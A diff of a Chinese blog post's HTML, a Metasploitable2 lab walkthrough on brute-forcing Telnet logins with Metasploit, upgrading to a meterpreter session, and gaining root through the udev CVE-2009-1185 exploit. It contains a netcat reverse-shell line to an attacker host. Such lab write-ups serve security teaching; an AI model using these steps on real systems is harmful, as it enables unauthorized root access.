@@ -24,13 +24,13 @@
 <meta property="og:description" content="继续上一篇的内容，本次使用的是Telnet的弱密码和登录提权。">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://chujian521.github.io/images/fj45.jpg">
-<meta property="og:image" content="https://chujian521.github.io/%5Cimages%5Cmetasploitable2-0.png">
-<meta property="og:image" content="https://chujian521.github.io/%5Cimages%5Ctelnet0.png">
-<meta property="og:image" content="https://chujian521.github.io/%5Cimages%5Ctelnet1.png">
-<meta property="og:image" content="https://chujian521.github.io/%5Cimages%5Ctelnet2.png">
-<meta property="og:image" content="https://chujian521.github.io/%5Cimages%5Ctelnet3.png">
+<meta property="og:image" content="https://chujian521.github.io/images/metasploitable2-0.png">
+<meta property="og:image" content="https://chujian521.github.io/images/telnet0.png">
+<meta property="og:image" content="https://chujian521.github.io/images/telnet1.png">
+<meta property="og:image" content="https://chujian521.github.io/images/telnet2.png">
+<meta property="og:image" content="https://chujian521.github.io/images/telnet3.png">
 <meta property="article:published_time" content="2020-05-02T09:08:57.000Z">
-<meta property="article:modified_time" content="2020-05-03T06:33:58.000Z">
+<meta property="article:modified_time" content="2022-10-30T04:52:39.562Z">
 <meta property="article:author" content="Encounter">
 <meta property="article:tag" content="漏洞利用">
 <meta property="article:tag" content="Metasploitable2">
@@ -325,12 +325,12 @@
 
 <h2 id="什么是Telnet？"><a href="#什么是Telnet？" class="headerlink" title="什么是Telnet？"></a>什么是Telnet？</h2><p>Telnet协议是TCP&#x2F;IP协议族中的一员，是internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。<br>虽然telnet较为简单实用也很方便，但是在格外注重安全的现代网络技术中，telnet并不被重用。原因在于telnet是一个明文传送协议，它将用户的所有内容，包括用户名和密码都以明文在互联网上传送，具有一定的安全隐患，因此许多服务器都会选择禁用telnet服务。如果我们要使用telnet的远程登录，使用前应在远端服务器上检查并设置允许telnet服务的功能。</p>
 <h2 id="Telnet登录提权"><a href="#Telnet登录提权" class="headerlink" title="Telnet登录提权"></a>Telnet登录提权</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p>扫描结果如下，我们发现23端口是开放的：</p>
-<p><img src="/%5Cimages%5Cmetasploitable2-0.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/metasploitable2-0.png" srcset="/img/loading.gif" lazyload></p>
 <p>打开msf，使用telnet_version模块来探测telnet的版本信息：</p>
 <p>use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_version</p>
 <p>set rhost  192.168.52.144</p>
 <p>run </p>
-<p><img src="/%5Cimages%5Ctelnet0.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/telnet0.png" srcset="/img/loading.gif" lazyload></p>
 <p>可以看到用户名密码都是msfadmin。</p>
 <h3 id="msf尝试登录"><a href="#msf尝试登录" class="headerlink" title="msf尝试登录"></a>msf尝试登录</h3><p>然后使用登录模块尝试登录：</p>
 <p>use auxiliary&#x2F;scanner&#x2F;telnet&#x2F;telnet_login </p>
@@ -338,9 +338,9 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">Module options (auxiliary/scanner/telnet/telnet_login):<br><br>   Name              Current Setting  Required  Description<br>   ----              ---------------  --------  -----------<br>   BLANK_PASSWORDS   <span class="hljs-literal">false</span>            no        Try blank passwords <span class="hljs-keyword">for</span> all <span class="hljs-built_in">users</span><br>   BRUTEFORCE_SPEED  5                <span class="hljs-built_in">yes</span>       How fast to bruteforce, from 0 to 5<br>   DB_ALL_CREDS      <span class="hljs-literal">false</span>            no        Try each user/password couple stored <span class="hljs-keyword">in</span> the current database<br>   DB_ALL_PASS       <span class="hljs-literal">false</span>            no        Add all passwords <span class="hljs-keyword">in</span> the current database to the list<br>   DB_ALL_USERS      <span class="hljs-literal">false</span>            no        Add all <span class="hljs-built_in">users</span> <span class="hljs-keyword">in</span> the current database to the list<br>   PASS_FILE                          no        File containing passwords, one per line<br>   RHOSTS                             <span class="hljs-built_in">yes</span>       The target host(s), range CIDR identifier, or hosts file with syntax <span class="hljs-string">&#x27;file:&lt;path&gt;&#x27;</span><br>   RPORT             23               <span class="hljs-built_in">yes</span>       The target port (TCP)<br>   STOP_ON_SUCCESS   <span class="hljs-literal">false</span>            <span class="hljs-built_in">yes</span>       Stop guessing when a credential works <span class="hljs-keyword">for</span> a host<br>   THREADS           1                <span class="hljs-built_in">yes</span>       The number of concurrent threads (max one per host)<br>   USERPASS_FILE                      no        File containing <span class="hljs-built_in">users</span> and passwords separated by space, one pair per line<br>   USER_AS_PASS      <span class="hljs-literal">false</span>            no        Try the username as the password <span class="hljs-keyword">for</span> all <span class="hljs-built_in">users</span><br>   USER_FILE                          no        File containing usernames, one per line<br>   VERBOSE           <span class="hljs-literal">true</span>             <span class="hljs-built_in">yes</span>       Whether to <span class="hljs-built_in">print</span> output <span class="hljs-keyword">for</span> all attempts<br><br></code></pre></td></tr></table></figure>
 
 <p>设置用户名、口令对应的文件路径，然后设置目标，run即可：</p>
-<p><img src="/%5Cimages%5Ctelnet1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/telnet1.png" srcset="/img/loading.gif" lazyload></p>
 <p>这个只是获取的msfadmin权限的shell，我们可以用sessions -u [id]把相应的连接设置成<strong>meterpreter shell</strong></p>
-<p><img src="/%5Cimages%5Ctelnet2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/telnet2.png" srcset="/img/loading.gif" lazyload></p>
 <p><strong>meterpreter shell</strong>是一种高级、隐蔽、多层面的且可动态扩展的payload，可以将反射dll注入到目标主机的内存中，还可以在运行时动态加载脚本和插件来进行后渗透利用。包括提权、转存系统账号、键盘记录、持久后门服务、启用远程桌面等，还有很多其他的扩展。而且，<strong>meterpreter</strong> shell的整个通信都是默认加密的。</p>
 <h3 id="利用exp提权"><a href="#利用exp提权" class="headerlink" title="利用exp提权"></a>利用exp提权</h3><p>从 <a target="_blank" rel="noopener" href="https://www.exploit-db.com/download/8572">https://www.exploit-db.com/download/8572</a></p>
 <p>下载exp，放到kali的&#x2F;var&#x2F;www&#x2F;html目录下，并将下载的C文件chmod 777 </p>
@@ -354,7 +354,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfadmin@metasploitable:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;#!/bin/sh&#x27;</span> &gt; /tmp/run<br>msfadmin@metasploitable:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/netcat -e /bin/sh 192.168.52.134 4444&#x27;</span> &gt;&gt; /tmp/run<br>msfadmin@metasploitable:~$ ps aux | grep udev<br>root      2719  0.0  0.1   2092   620 ?        S&lt;s  07:31   0:00 /sbin/udevd --daemon<br>msfadmin  7331  0.0  0.1   3008   772 pts/2    R+   22:05   0:00 grep udev<br><span class="hljs-comment">#执行exploit 具有root权限的pid减1</span><br>msfadmin@metasploitable:~$ ./exploit 2718<br><br></code></pre></td></tr></table></figure>
 
 <p>运行完之后，监听端口反弹shell，拿到root权限：</p>
-<p><img src="/%5Cimages%5Ctelnet3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/telnet3.png" srcset="/img/loading.gif" lazyload></p>
 <p>然后可以使用 python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’ 获取伪终端方便使用</p>
 <h3 id="为什么可以提权"><a href="#为什么可以提权" class="headerlink" title="为什么可以提权"></a>为什么可以提权</h3><p>提权代码利用的是cve-2009-1185  init未检查NETLINK消息来源,本地提权漏洞。</p>
 <p>udev是Linuxkernel系列的设备管理器，主要功能是管理&#x2F;dev目录下的设备节点。udev没有正确地检查Netlink消息的来源，本地攻击者可以利用这个漏洞从用户空间进程而不是内核向udev发送特制的Netlink消息，导致其创建已有系统块设备(如root文件系统)完全可写的块设备文件，以获得root用户权限。</p>
